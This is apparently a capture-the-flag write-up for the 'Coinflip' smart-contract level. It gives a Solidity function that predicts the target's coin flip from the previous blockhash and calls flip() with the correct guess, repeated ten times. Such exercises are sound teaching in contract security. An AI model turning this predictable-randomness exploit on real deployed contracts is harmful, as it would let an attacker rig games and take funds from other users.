# Coinflip

The fact that multiple transactions can share the same block number and block hash made this hack possible.

## How to complete

```Solidity
function guess(address coinFlipInstance) external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue /
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;

    CoinFlip(coinFlipInstance).flip(side);
}
```

Put the above function in a contract and call it 10 times (this is a little tedious but fulfilling the first time) passing in your instance address.

This function calculates the side of the coin using the same technique the instance contract does. And because the transaction of `flip(bool)` function call will also be in the same block as the transaction of the `guess(address)` call, they both will share the same `block.number`.

*NOTE* You will also need to import the CoinFlip contract in the contract you will create.
